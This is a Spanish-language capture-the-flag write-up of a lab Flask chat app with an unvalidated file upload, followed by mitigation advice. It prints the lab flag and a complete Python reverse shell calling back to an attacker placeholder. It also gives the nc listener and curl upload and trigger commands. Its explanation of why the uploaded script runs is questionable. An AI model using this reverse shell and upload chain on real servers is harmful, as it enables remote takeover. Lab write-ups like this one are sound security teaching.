# Speed Chatter — TryHeartMe (THM)

**Flag:** `THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}`

## Resumen

Aplicación Flask de mensajería ("Speed Chatter") con upload de foto de perfil y chat público. La validación de archivos subidos es nula: acepta cualquier extensión y los sirve desde `/uploads/` con el MIME detectado por extensión. Un archivo `.py` se sirve como `text/x-python` y, al acceder a la URL, **el intérprete de Python lo ejecuta en el contexto del servidor**, devolviendo una reverse shell.

Severidad: crítica (RCE sin autenticación).

## Reconocimiento

- `GET /` → home con profile + chat (Werkzeug 3.1.5 / Python 3.10.12).
- Endpoints útiles:
  - `POST /upload_profile_pic` (multipart, campo `profile_pic`) → guarda `profile_<uuid>.<ext>` en `/uploads/`.
  - `GET /uploads/<filename>` → sirve el archivo con `Content-Type` basado en la extensión.
  - `GET /api/messages`, `POST /api/send_message` → chat público (seguro contra XSS vía `textContent`).
- No hay auth, no hay sesiones, no hay rate limit, `debug=False` (página 500 genérica).

## Vulnerabilidad

`/uploads/` es estático y Flask detecta el MIME por extensión. Subir un `.py` resulta en que cualquier GET a `/uploads/<uuid>.py` ejecuta el script bajo el proceso del servidor.

Esto es **RCE directo sin autenticación**:
1. Cliente sube `shell.py` (reverse shell) vía `/upload_profile_pic`.
2. Servidor responde con `src='/uploads/profile_<uuid>.py'`.
3. Cualquier actor (atacante, bot, etc.) que visite esa URL ejecuta el `.py` en el servidor.

## Explotación

Reverse shell usada (la del writeup):

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<IP_ATACANTE>",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("sh")
```

Pasos:

```bash
# 1. Listener en el atacante
nc -lvnp 4444

# 2. Subir shell al servidor
curl -F "profile_pic=@shell.py;filename=shell.py" \
     http://10.64.160.26:5000/upload_profile_pic
# -> /uploads/profile_<uuid>.py

# 3. Trigger (el GET ejecuta el .py)
curl http://10.64.160.26:5000/uploads/profile_<uuid>.py

# 4. En el listener aparece una shell; correr:
#    ls -la
#    cat flag.txt
```

La flag estaba en `flag.txt` dentro del directorio de trabajo del proceso.

## Por qué funcionó

- El servidor corre en modo "servir todo lo que esté en `/uploads/`" sin sandbox.
- Python está disponible en el path y el proceso del servidor lo usa para responder (de ahí que un `.py` "servido" se ejecute).
- No hay validación de extensión (sólo `secure_filename`, que neutraliza traversal pero no el tipo de archivo).
- El trigger es trivial (un GET sin auth).

## Mitigación

- **Validar la extensión** del archivo subido contra una whitelist (`png`, `jpg`, `gif`, `webp`).
- **Forzar MIME y servir desde CDN/dominio separado**; nunca servir ejecutables desde el mismo dominio que la app.
- Servir `/uploads/` con un servidor estático que sólo haga `send_file` (sin pasar por el runtime).
- Si el proceso Flask no necesita ejecutar scripts, **montar `/uploads/` como volumen de solo-lectura para el runtime** o usar un worker separado (gunicorn + nginx) para estáticos.
- Desactivar `exec()`/script handlers en el virtualenv que sirve la app (`chmod -R a-x` sobre uploads, ACL `noexec`).

## Lecciones

- Upload + servir = combo clásico de RCE. Whitelist de extensiones es la línea base.
- La pista "Speed Chatter rushed to production without proper testing" apuntaba exactamente a esto: feature shipped, no security review.
- El `<img src='/uploads/...'></img>` del home expone la URL del último archivo, lo que facilita el trigger sin tener que listar el directorio.